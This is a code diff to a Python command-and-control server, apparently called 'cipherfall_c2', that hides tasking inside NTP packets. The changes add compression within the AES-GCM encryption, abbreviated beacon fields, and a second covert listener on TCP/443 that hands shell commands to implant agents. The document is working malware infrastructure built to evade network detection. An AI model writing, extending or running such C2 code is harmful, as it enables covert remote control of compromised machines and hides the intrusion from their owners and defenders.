@@ -74,7 +74,7 @@ Limitations:
   - Output truncated at MAX_OUTPUT bytes on the agent side (see agent.py).
 """
 
-import asyncio, hashlib, json, os, sqlite3, time, uuid
+import asyncio, hashlib, json, os, sqlite3, time, uuid, zlib
 from dotenv import load_dotenv
 from fastapi import FastAPI, HTTPException, Request
 import uvicorn
@@ -101,14 +101,14 @@ _KEY = PBKDF2(PSK.encode(), b"cipherfall_c2_v1", dkLen=32,
 def _encrypt(obj):
     nonce  = get_random_bytes(12)
     cipher = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
-    ct, tag = cipher.encrypt_and_digest(json.dumps(obj).encode())
+    ct, tag = cipher.encrypt_and_digest(zlib.compress(json.dumps(obj).encode(), 9))
     return nonce + ct + tag
 
 
 def _decrypt(blob):
     nonce, ct, tag = blob[:12], blob[12:-16], blob[-16:]
     cipher = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
-    return json.loads(cipher.decrypt_and_verify(ct, tag))
+    return json.loads(zlib.decompress(cipher.decrypt_and_verify(ct, tag)))
 
 
 def _ntp_ts(t=None):
@@ -219,10 +219,10 @@ def _handle_beacon(msg):
             (now, json.dumps(sysinfo), agent_id)
         )
 
-    result = msg.get("result")
+    result = msg.get("r") or msg.get("result")
     if result:
-        task_id = result.get("task_id", "")
-        output  = result.get("output", "")
+        task_id = result.get("t") or result.get("task_id", "")
+        output  = result.get("o") or result.get("output", "")
         with _db() as con:
             con.execute(
                 "UPDATE tasks SET status='done', output=? WHERE id=?",
@@ -246,6 +246,37 @@ def _pop_pending_task(agent_id):
     return row["id"], row["command"]
 
 
+def _process_ntp(data):
+    client_tx_ts, msg = _parse_request(data)
+    if client_tx_ts is None:
+        return None
+    cmd_blob = None
+    if msg:
+        agent_id = msg.get("id", "")
+        _handle_beacon(msg)
+        task_id, command = _pop_pending_task(agent_id)
+        if task_id:
+            cmd_blob = _encrypt({"task_id": task_id, "cmd": command})
+            if DEBUG:
+                print(f"[ntp] dispatch task={task_id[:8]}  agent={agent_id[:8]}")
+    return _build_response(client_tx_ts, cmd_blob)
+
+
+async def _handle_tcp(reader, writer):
+    try:
+        hdr = await asyncio.wait_for(reader.readexactly(2), timeout=10)
+        pkt_len = struct.unpack("!H", hdr)[0]
+        data = await asyncio.wait_for(reader.readexactly(pkt_len), timeout=10)
+        response = _process_ntp(data)
+        if response:
+            writer.write(struct.pack("!H", len(response)) + response)
+            await writer.drain()
+    except Exception:
+        pass
+    finally:
+        writer.close()
+
+
 class _NTPProtocol(asyncio.DatagramProtocol):
     def __init__(self):
         self.transport = None
@@ -254,23 +285,9 @@ class _NTPProtocol(asyncio.DatagramProtocol):
         self.transport = transport
 
     def datagram_received(self, data, addr):
-        client_tx_ts, msg = _parse_request(data)
-        if client_tx_ts is None:
-            return
-
-        cmd_blob = None
-
-        if msg:
-            agent_id = msg.get("id", "")
-            _handle_beacon(msg)
-            task_id, command = _pop_pending_task(agent_id)
-            if task_id:
-                cmd_blob = _encrypt({"task_id": task_id, "cmd": command})
-                if DEBUG:
-                    print(f"[ntp] dispatch task={task_id[:8]}  agent={agent_id[:8]}")
-
-        response = _build_response(client_tx_ts, cmd_blob)
-        self.transport.sendto(response, addr)
+        response = _process_ntp(data)
+        if response:
+            self.transport.sendto(response, addr)
 
     def error_received(self, exc):
         pass
@@ -326,7 +343,8 @@ async def _main():
         local_addr=("0.0.0.0", 123),
         family=_socket.AF_INET,
     )
-    print(f"[*] NTP C2 listening on UDP/123")
+    tcp_server = await asyncio.start_server(_handle_tcp, "0.0.0.0", 443)
+    print(f"[*] NTP C2 listening on UDP/123 + TCP/443")
     print(f"[*] Admin API on http://127.0.0.1:{ADMIN_PORT}")
 
     cfg = uvicorn.Config(admin, host="127.0.0.1", port=ADMIN_PORT, log_level="error")
@@ -336,6 +354,7 @@ async def _main():
         await srv.serve()
     finally:
         transport.close()
+        tcp_server.close()
 
 
 if __name__ == "__main__":
